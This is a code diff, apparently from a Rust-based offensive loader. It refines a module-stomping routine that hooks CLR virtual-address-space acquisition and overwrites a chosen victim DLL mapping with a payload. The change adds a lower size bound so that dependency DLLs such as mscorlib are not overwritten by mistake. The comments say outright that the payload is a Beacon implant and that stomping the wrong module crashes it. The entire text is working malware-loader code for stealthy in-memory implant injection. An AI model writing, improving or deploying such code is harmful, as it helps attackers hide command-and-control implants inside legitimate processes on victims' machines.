@@ -385,16 +385,26 @@ unsafe extern "system" fn mm_acquired_vas(
             return S_OK;
         }
 
-        // Upper-bound guard: reject mappings significantly larger than the
-        // selected victim. Dependency DLLs loaded during Load_2 can be larger
-        // than the victim; we don't want to stomp them.
-        // victim_image_size == usize::MAX means GAC read failed — skip check.
+        // Tight size-band guard: only accept mappings within ±64 KB of the
+        // selected victim's on-disk SizeOfImage. Dependency DLLs loaded during
+        // Load_2 can fall anywhere between payload_image_size and the victim
+        // size; the upper bound alone is not sufficient when payload is large
+        // (e.g. mscorlib at ~5 MB fits between a 200 KB payload and a 6 MB
+        // System.ServiceModel victim and would get wrong-stomped → Beacon
+        // crash). The combined upper and lower bound narrows the window to a
+        // single victim-sized DLL.
+        // victim_image_size == usize::MAX means GAC read failed — skip both
+        // bounds and fall back to the original "size >= payload" behaviour.
         let victim_image_size = (*sp).victim_image_size;
-        if victim_image_size != usize::MAX
-            && size > victim_image_size.saturating_add(0x10000)
-        {
-            crate::dlog2(b"[stomp] mapping too large (dependency?), skipping");
-            return S_OK;
+        if victim_image_size != usize::MAX {
+            if size > victim_image_size.saturating_add(0x10000) {
+                crate::dlog2(b"[stomp] mapping too large (dependency?), skipping");
+                return S_OK;
+            }
+            if size < victim_image_size.saturating_sub(0x10000) {
+                crate::dlog2(b"[stomp] mapping too small for victim, skipping");
+                return S_OK;
+            }
         }
 
         let start_u8 = start_addr as *const u8;
